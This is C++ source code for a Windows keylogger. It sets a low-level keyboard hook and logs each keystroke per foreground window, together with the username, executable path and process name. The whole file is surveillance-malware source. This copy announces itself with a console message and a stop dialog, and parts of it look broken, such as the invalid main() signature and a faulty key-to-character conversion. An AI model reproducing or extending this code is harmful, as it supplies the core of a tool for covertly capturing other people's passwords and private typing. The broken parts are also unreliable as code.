#include "Server.h"
#include "Keylogger.h"
#include "Configuration.h"
#include "Log.h"
#include <Psapi.h>
#include <iostream>
#include <string>
#include <Lmcons.h>
#include <thread>
#include <map>

#define MAX_PATH 256

string getCurrentDate()
{
	time_t t = time(0);   // get time now
	char buffer[80];
	struct tm * now = localtime(&t);

	strftime(buffer, sizeof(buffer), "%d-%m-%Y %H:%M:%S", now);
	return (buffer);
}

Json::Value _root;
string date = getCurrentDate();

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	string char_string;
	char exe_name[MAX_PATH + 1], username[UNLEN + 1], wndw_title[MAX_PATH], *path;

	int last_key_code = '\0';
	DWORD childpid, username_len = UNLEN + 1;
	HANDLE window_proc;
	HWND hwnd = GetForegroundWindow(); // Gets a handler for the current window

	GetWindowThreadProcessId(hwnd, &childpid);
	window_proc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, childpid);
	GetWindowText(hwnd, wndw_title, sizeof(wndw_title));
	GetModuleFileNameEx(window_proc, NULL, exe_name, MAX_PATH);
	GetUserName(username, &username_len);
	CloseHandle(window_proc);

	_root[wndw_title]["Date"] = date;
	if (_root.isMember(wndw_title))
	{
		if (!_root[wndw_title].isMember("User")) { _root[wndw_title]["User"] = username; }
		if (!_root[wndw_title].isMember("Path")) { _root[wndw_title]["Path"] = exe_name; }
		if (!_root[wndw_title].isMember("Process name")) {
			_root[wndw_title]["Process name"] 
			  = string(exe_name).substr(string(exe_name).find_last_of('\\') + 1,
				string(exe_name).length() - 1); }
	}

	cout << endl;
	// If key is being pressed
	if (wParam == WM_KEYDOWN) {

		last_key_code = p->vkCode;
		switch (p->vkCode) {

		case VK_CAPITAL:	_root[wndw_title]["Keystrokes"].append("<CAPLOCK> ");	break;
		case VK_SHIFT:		_root[wndw_title]["Keystrokes"].append("<SHIFT> ");		break;
		case VK_LCONTROL:	_root[wndw_title]["Keystrokes"].append("<LCTRL> ");		break;
		case VK_RCONTROL:	_root[wndw_title]["Keystrokes"].append("<RCTRL> ");		break;
		case VK_INSERT:		_root[wndw_title]["Keystrokes"].append("<INSERT> ");	break;
		case VK_END:		_root[wndw_title]["Keystrokes"].append("<END> ");		break;
		case VK_PRINT:		_root[wndw_title]["Keystrokes"].append("<PRINT> ");		break;
		case VK_DELETE:		_root[wndw_title]["Keystrokes"].append("<DEL> ");		break;
		case VK_BACK:		_root[wndw_title]["Keystrokes"].append("<BK> ");		break;
		case VK_LMENU:		_root[wndw_title]["Keystrokes"].append("<LALT> ");		break;
		case VK_RMENU:		_root[wndw_title]["Keystrokes"].append("<RALT> ");		break;
		case VK_TAB:		_root[wndw_title]["Keystrokes"].append("<TAB> ");		break;
		case VK_RETURN:		_root[wndw_title]["Keystrokes"].append("<ENTER> \n");	break;
		case 160:			_root[wndw_title]["Keystrokes"].append("<LSHIFT> ");	break;
		case 161:			_root[wndw_title]["Keystrokes"].append("<RSHIFT> ");	break;

			// Visible keys
		default:
			if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
				/*if (last_key_code == 160 || last_key_code == 161)
				{

				}*/
				_root[wndw_title]["Keystrokes"].append(string(1, (char)(p->vkCode)));
			else
			{
				_root[wndw_title]["Keystrokes"].append(string(1, (char)(p->vkCode + 32)));
			}
			break;
		
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(string logfile_location, int duration = 0)
{
	//Set windows hook
	HHOOK keyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL,
		KeyboardProc,
		NULL,
		0);

	Sleep(1000); // pause for 1 second
	cout << "---------> Keylogger initialized" << endl;
	MessageBox(NULL, "Press OK to stop logging.", "Information", MB_OK);

	cout << _root << endl;
	system("pause");
	UnhookWindowsHookEx(keyboardHook);
	exit(0);
}
